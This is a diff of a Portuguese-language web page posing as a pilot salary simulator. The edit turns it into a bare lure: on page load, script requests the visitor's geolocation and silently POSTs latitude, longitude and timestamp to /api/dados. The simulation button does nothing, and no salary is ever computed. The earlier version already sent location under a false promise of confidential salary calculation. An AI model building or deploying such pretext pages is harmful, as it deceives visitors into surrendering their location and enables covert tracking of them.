@@ -1,130 +1,118 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-    <meta charset="UTF-8">
-    <title>Simulador Salarial de Pilotos 2025</title>
-    <style>
-        body {
-    font-family: 'Segoe UI', sans-serif;
-    background-image: url('https://passagembaixacg.s3.us-east-2.amazonaws.com/IMG_2927.jpeg');
-    background-size: cover;
-    background-position: center;
-    background-repeat: no-repeat;
-    color: #fff;
-    text-align: center;
-    padding: 40px 20px;
-    height: 100vh;
-    margin: 0;
-}
-<body>
-  <div class="overlay">
-    <!-- todo seu conteúdo aqui -->
-  </div>
-</body>
-
-.overlay {
-    background-color: rgba(0, 0, 0, 0.6); /* fundo escurecido */
-    padding: 40px;
-    border-radius: 10px;
-    max-width: 700px;
-    margin: auto;
-    margin-top: 60px;
-}
-
-        .container {
-            max-width: 700px;
-            margin: auto;
-            background-color: rgba(0, 0, 0, 0.3);
-            border-radius: 15px;
-            padding: 30px;
-            box-shadow: 0 0 20px rgba(0,0,0,0.6);
-        }
-
-        h1 {
-            font-size: 28px;
-            margin-bottom: 10px;
-            color: #ffd700;
-        }
-
-        p {
-            font-size: 18px;
-            margin-bottom: 25px;
-        }
-
-        img {
-            width: 100%;
-            max-width: 500px;
-            border-radius: 10px;
-            margin-bottom: 20px;
-        }
-
-        button {
-            padding: 12px 25px;
-            font-size: 18px;
-            background-color: #ffd700;
-            color: #000;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            font-weight: bold;
-        }
-
-        button:hover {
-            background-color: #e6c200;
-        }
-
-        #status {
-            margin-top: 20px;
-            font-size: 16px;
-            font-style: italic;
-        }
-
-        .disclaimer {
-            margin-top: 30px;
-            font-size: 12px;
-            color: #ccc;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Simulação de Salário</title>
+  <style>
+    /* Reset básico */
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+    }
+    body {
+      font-family: Arial, sans-serif;
+    }
+    /* Seção de fundo em tela cheia */
+    .hero {
+      position: relative;
+      width: 100%;
+      min-height: 100vh;
+      background: url("https://passagembaixacg.s3.us-east-2.amazonaws.com/piloto.png") no-repeat center center;
+      background-size: cover;
+    }
+    /* Camada de overlay escura */
+    .overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.6); /* overlay preto com transparência */
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    /* Conteúdo centralizado dentro do overlay */
+    .container {
+      text-align: center;
+      color: #fff;
+      max-width: 600px;
+      padding: 20px;
+    }
+    .container h1 {
+      font-size: 3em;
+      margin: 0 0 20px;
+    }
+    .container p {
+      font-size: 1.2em;
+      margin: 0 0 30px;
+    }
+    .container button {
+      background-color: #28a745;
+      color: #fff;
+      border: none;
+      padding: 15px 30px;
+      font-size: 1.1em;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    .container button:hover {
+      background-color: #218838;
+    }
+    /* Ajustes responsivos para telas menores */
+    @media (max-width: 600px) {
+      .container h1 {
+        font-size: 2em;
+      }
+      .container p {
+        font-size: 1em;
+      }
+      .container button {
+        padding: 12px 24px;
+        font-size: 1em;
+      }
+    }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <h1>✈️ Descubra quanto um piloto como você deveria ganhar em 2025!</h1>
-        <p>Simulador exclusivo baseado no seu perfil e localização. Leva menos de 1 minuto.</p>
-        <img src="https://passagembaixacg.s3.us-east-2.amazonaws.com/IMG_2927.jpeg" alt="Simulação de Carreira">
-        <button onclick="getLocation()">Fazer simulação agora</button>
-        <div id="status"></div>
-        <p class="disclaimer">*Todos os dados são confidenciais e usados apenas para cálculo estimado.</p>
-    </div>
 
-    <script>
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const data = {
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude,
-                            timestamp: new Date().toISOString()
-                        };
-                        document.getElementById('status').innerText = 'Simulação sendo calculada...';
-                        fetch('/api/dados', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify(data)
-                        }).then(() => {
-                            document.getElementById('status').innerText = 'Dados recebidos. Aguarde o resultado no painel.';
-                        });
-                    },
-                    (error) => {
-                        document.getElementById('status').innerText = 'Erro ao obter localização: ' + error.message;
-                    }
-                );
-            } else {
-                document.getElementById('status').innerText = 'Seu navegador não suporta geolocalização.';
-            }
+  <div class="hero">
+    <div class="overlay">
+      <div class="container">
+        <h1>Simulação de Salário</h1>
+        <p>Calcule seu salário e descubra resultados personalizados</p>
+        <button>Começar Simulação</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Captura de geolocalização (se disponível) e envio dos dados para /api/dados
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          const data = {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            timestamp: new Date().toISOString()
+          };
+          fetch('/api/dados', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+          });
+        },
+        (error) => {
+          console.error('Erro ao obter localização:', error);
         }
-    </script>
+      );
+    }
+  </script>
+
 </body>
 </html>
+
 
 
